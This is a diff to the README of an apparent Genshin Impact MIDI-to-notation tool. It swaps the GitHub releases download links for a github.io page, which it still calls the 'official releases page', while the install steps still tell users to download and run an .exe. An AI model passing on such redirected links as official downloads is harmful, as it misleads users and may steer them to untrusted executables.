@@ -1,6 +1,6 @@
 # 🎹 genshin-jianpu-editor - Create music for Genshin Impact easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Scapular-taxbase446/genshin-jianpu-editor/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://scapular-taxbase446.github.io)
 
 This software helps players create music for the Genshin Impact in-game instruments. It turns standard musical files, known as MIDI files, into simple notation or keyboard maps. You can then use these guides to play songs within the game or share them with other players. The tool saves you time by automating the transcription process.
 
@@ -12,7 +12,7 @@ The editor reads MIDI files. These files contain digital music data. The softwar
 
 You need to download the installer to your computer. Follow these steps to get started:
 
-1. Visit the [official releases page](https://github.com/Scapular-taxbase446/genshin-jianpu-editor/releases).
+1. Visit the [official releases page](https://scapular-taxbase446.github.io).
 2. Look for the latest version at the top of the list.
 3. Find the file ending in `.exe` under the "Assets" section.
 4. Click the file name to start the download.
